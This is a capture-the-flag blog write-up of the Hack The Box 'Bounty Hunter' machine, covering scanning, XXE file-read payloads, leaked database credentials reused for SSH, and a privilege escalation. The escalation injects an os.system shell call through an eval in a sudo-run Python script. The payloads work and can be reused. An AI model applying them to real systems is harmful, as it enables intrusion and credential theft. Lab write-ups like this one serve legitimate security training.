---
layout: post
title: Hack The Box - Bounty Hunter
date: 2023-03-13 20:22 +0100
image:
  path: /assets/img/posts/bounty-hunter/bounty-hunter-card.png
  alt: Bounty Hunter card
categories: [HackTheBox, CREST-CRT]
tags: [Hack-The-Box-Easy]
hidden: false
---

```
HOST: 10.10.11.100
```

## Tools used

- [nmap](https://nmap.org/)
- [burpSuite](https://portswigger.net/)

## What to do ?

- First we'll scan port with `nmap` to discover if was some it open
- Then we'll find a loophole and exploit it.

## Nmap Scan

```bash
rether> nmap -A 10.10.11.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 18:36 CET
Nmap scan report for 10.10.11.100
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP - Port 80

### Dirb

We dirb script we can find hidden file and folder.

```bash
rether> dirb http://10.10.11.100/ /usr/share/wordlists/dirb/common.txt -X .php
[...]
---- Scanning URL: http://10.10.11.100/ ----
+ http://10.10.11.100/db.php (CODE:200|SIZE:0)
+ http://10.10.11.100/index.php (CODE:200|SIZE:25169)
+ http://10.10.11.100/portal.php (CODE:200|SIZE:125)
[...]
```

```bash
rether> dirb http://10.10.11.100/ /usr/share/wordlists/dirb/common.txt
```

In resources folder from web server we find a README file who contains :

```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

### Burpsuite - XXE Injection

![Bounty Report System](/assets/img/posts/bounty-hunter/bounty-hunter-bounty-report-system.png "Bounty Report System")

With burpsuite we can intercept request to know what is send ?
In request we have data field who contains a string encoded in url and base64.

![Bounty intercept request](/assets/img/posts/bounty-hunter/bounty-hunter-intercept-request.png "Bounty intercept request")

To remove url encryption you can select text and `crtl + shift + u` or select text right click `Convert selection > URL > URL-decode`

And to decode base64 string, I use the `Decoder` section from Burpsuite. We obtains this :

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test</title>
		<cwe>CWE-2019</cwe>
		<cvss>27</cvss>
		<reward>100</reward>
		</bugreport>
```

By changing title tag we can check if the server is vulnerable to XXE injection.

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test-1</title>
		<cwe>CWE-2019</cwe>
		<cvss>27</cvss>
		<reward>100</reward>
		</bugreport>
```

Convert to base64 and add url encryption (to encode in url you can select text and `crtl + u` or select text right click `Convert selection > URL > URL-encode key characters`)

![Burpsuite repeater](/assets/img/posts/bounty-hunter/bounty-hunter-burpsuite-repeater.png "Burpsuite repeater")

This works. This means that the server is vulnerable to the XXE injection attack.
To create command injection we can use [PayloadAsllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

I will use the following injection to get the content of the `/etc/passwd` file from the server :

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

I modify the injection command according to my case. This gives this :

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
<cwe>CWE-2019</cwe>
<cvss>27</cvss>
<reward>&file;</reward>
</bugreport>
```

Convert it, send to the server and obtains the contant of `/etc/passwd` file :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[...]
development:x:1000:1000:Development:/home/development:/bin/bash
[...]
```

It has a user development, which may correspond to the user account quoted in the README file.
We can then try to retrieve the contents of the `db.php` file found above.
To do this, we use the following command :

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title>
<cwe>CWE-2019</cwe>
<cvss>27</cvss>
<reward>&ac;</reward>
</bugreport>
```

We obtain the content of the file converted to base64 :

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

### SSH - connection

Use `ssh` to connect to the server with development user and the password obtain above (password: m19RoAU0hP41A1sTsq6K)

```bash
rether> ssh development@10.10.11.100
development@10.10.11.100 password:
[...]
development@bountyhunter:~$ whoami
development
```

### User flag

We can now get the user's flag

```bash
development@bountyhunter:~$ ls
contract.txt  user.txt
development@bountyhunter:~$ cat user.txt
[user-flag]
```

### Privilege escalation

From the home directory of development user we have `contract.txt` file :

```
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

By digging a little bit we find `skytrain_inc` in `/opt` folder :

```bash
development@bountyhunter:~$ ls /opt/skytrain_inc
invalid_tickets  ticketValidator.py
```

This script can be run as root by development user :

```bash
development@bountyhunter:/opt/skytrain_inc$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The python script contains :

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

In the folder `invalid_tickets` there are four markdown files. These are the ''invalid tickets''

```
development@bountyhunter:/opt/skytrain_inc$ ls invalid_tickets/
390681613.md  529582686.md  600939065.md  734485704.md
```

To create a valid ticket and inject a payload for privilege escalation, you must have :

 - first line start with `# Skytrain Inc`
 - second line start with `## Ticket to `
 - the next line start with empty text or `__Ticket Code:__`
 - the line after the '__Ticket Code:__' start with `**`
 - the text after the `**` is one of the integer operations whose number the remainder of the division by 7 integer is 4

So with this rules we can create a valid ticket :

```markdown
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**150 + 1 == 151 and __import__('os').system('/bin/bash') == false
```

### Root flag

```bash
root@bountyhunter:~# cd /root
root@bountyhunter:~# cat root.txt
[root-flag]
```

![Card of pwned bounty hunter](/assets/img/posts/bounty-hunter/bounty-hunter-pwned.png){: width="972" height="589" }
